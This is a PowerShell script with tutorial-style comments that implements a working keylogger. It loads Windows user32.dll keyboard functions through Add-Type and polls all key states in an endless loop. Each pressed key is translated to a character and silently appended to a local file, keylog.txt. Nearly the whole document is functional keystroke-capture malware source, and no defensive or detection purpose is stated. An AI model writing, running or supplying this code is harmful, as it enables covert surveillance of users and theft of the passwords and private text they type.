# Powershell by itself cant keylog
# But we can use certain libraries to detect these key presses
# All we have to do is create logic to capture these key presses

# These are the specific libraries we are going to call from
$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@
# We can assemble them in API-like functionality to call
$built_api = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
# Create our file
$output_path = "keylog.txt"
$null = New-Item -Path $output_path -ItemType File -Force
# Now we can incorporate our logic
while ($true) {
    # Sleep 40 milliseconds so we dont kill the cpu
    Sleep -Milliseconds 40
    # Codes 0-8 are not usable so read to 254
    for ($ascii = 9; $ascii -le 254; $ascii++) {
        # Get the state
        $state = $built_api::GetAsyncKeyState($ascii)
        # If it was pressed, do this
        if ($state -eq -32767) {
            # Check caps lock state
            $null = [console]::CapsLock
            # Translate scan code to virtual key code
            $virtual_key = $built_api::MapVirtualKey($ascii, 3)
            # Prepare to write to buffer when reading state
            $key_state = New-Object Byte[] 256
            # Read state to get the key
            $check_key_state = $built_api::GetKeyboardState($key_state)
            # Prepare string builder to receive an input key
            $current_char = New-Object -TypeName System.Text.StringBuilder
            # Translate key into unicode character
            $success = $built_api::ToUnicode($ascii, $virtual_key, $key_state, $current_char, $current_char.Capacity, 0)
            # If it worked, write it to the file
            if ($success) {
                [System.IO.File]::AppendAllText($output_path, $current_char, [System.Text.Encoding]::Unicode) 
            }
        }
    }
}
